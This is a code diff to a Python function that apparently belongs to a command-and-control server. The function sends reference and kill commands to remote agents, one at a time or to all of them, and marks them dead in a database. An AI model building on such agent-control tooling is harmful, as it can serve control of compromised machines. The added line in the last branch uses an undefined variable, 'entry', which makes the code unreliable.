@@ -5,6 +5,7 @@ def sendRefCMD(tsObj, destGroup, endpoint, refId):
     #send manual ping, expect resync back from agent
     #send refid kill, agent will clean up, status dead in db
     if destGroup == "agent":
+        tsObj.getDBObj().deadStatus(endpoint)
         print(colored(f" Sending Reference \"{refId}\" ==> ({endpoint})\n", "magenta"))
 
         iPacket = packets.IDPacket(endpoint, refId)
@@ -12,15 +13,19 @@ def sendRefCMD(tsObj, destGroup, endpoint, refId):
     
     elif destGroup == "all": #shutdown only
         data = tsObj.getDBObj().dbPull()
-        for entry in data:
-           print(entry[0][0]) 
+        if len(data) == 0:
+            return 
 
-           iPacket = packet.IDPacket(entry[0][0], refId)
-           iPacket.sendIdPacket()
+        for entry in data:
+            tsObj.getDBObj().deadStatus(entry[0])
+            print(colored(f" Sending Reference \"{refId}\" ==> ({entry[0]})\n", "magenta"))
+            iPacket = packets.IDPacket(entry[0], refId)
+            iPacket.sendIdPacket()
 
     else:
         data = tsObj.getDBObj().pullSpecific(destGroup, endpoint)
         for ip in data:
+            tsObj.getDBObj().deadStatus(entry[0])
             print(colored(f" Sending Reference \"{refId}\" ==> {ip[0]} ({endpoint})\n", "magenta"))
 
             iPacket = packets.IDPacket(ip[0], refId)
